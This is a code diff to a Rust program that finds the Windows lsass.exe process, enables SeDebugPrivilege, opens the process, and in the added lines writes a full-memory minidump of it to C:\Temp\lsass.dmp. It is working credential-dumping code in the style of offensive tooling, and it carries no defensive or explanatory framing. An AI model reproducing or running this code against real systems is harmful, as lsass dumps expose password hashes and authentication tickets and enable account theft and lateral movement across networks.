@@ -3,12 +3,20 @@ use std::{mem::zeroed, os::raw::c_void, ptr::null_mut};
 use windows_sys::{
     Wdk::System::SystemInformation::NtQuerySystemInformation,
     Win32::{
-        Foundation::{ERROR_NOT_ALL_ASSIGNED, GetLastError, STATUS_INFO_LENGTH_MISMATCH},
+        Foundation::{
+            ERROR_NOT_ALL_ASSIGNED, GENERIC_WRITE, GetLastError, INVALID_HANDLE_VALUE,
+            STATUS_INFO_LENGTH_MISMATCH,
+        },
         Security::{
             AdjustTokenPrivileges, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
             TOKEN_QUERY,
         },
+        Storage::FileSystem::{CREATE_ALWAYS, CreateFileA, CreateFileW, FILE_ATTRIBUTE_NORMAL},
         System::{
+            Diagnostics::Debug::{
+                MiniDumpWithFullMemory, MiniDumpWithFullMemoryInfo, MiniDumpWithThreadInfo,
+                MiniDumpWriteDump, WriteProcessMemory,
+            },
             Threading::{
                 GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
                 PROCESS_VM_READ, PROCESS_VM_WRITE,
@@ -130,12 +138,14 @@ fn main() {
 
     if pid == 0 {
         println!("[-] Failed to find lsass.exe process");
+        return;
     }
 
     println!("[+] Found lsass.exe process with PID: {}", pid);
 
     if !enable_privilege() {
         println!("[-] Failed to enable SeDebugPrivilege");
+        return;
     }
 
     println!("[+] SeDebugPrivilege enabled successfully");
@@ -149,8 +159,40 @@ fn main() {
 
         if lsass_handle.is_null() {
             println!("[-] Failed to open lsass.exe process");
+            return;
         }
 
         println!("[+] Opened handle to lsass.exe process: {:?}", lsass_handle);
+
+        let file_handle = CreateFileA(
+            "C:\\Temp\\lsass.dmp\0".as_ptr() as *const u8,
+            GENERIC_WRITE,
+            0,
+            null_mut(),
+            CREATE_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL,
+            null_mut(),
+        );
+
+        if file_handle == INVALID_HANDLE_VALUE {
+            println!("[-] Failed to create dump file");
+            return;
+        }
+
+        if MiniDumpWriteDump(
+            lsass_handle,
+            pid,
+            file_handle,
+            MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithThreadInfo,
+            null_mut(),
+            null_mut(),
+            null_mut(),
+        ) == 0
+        {
+            println!("[-] Failed to write minidump of lsass.exe process");
+            return;
+        }
+
+        println!("[+] Successfully dumped lsass.exe process to C:\\Temp\\lsass.dmp");
     }
 }
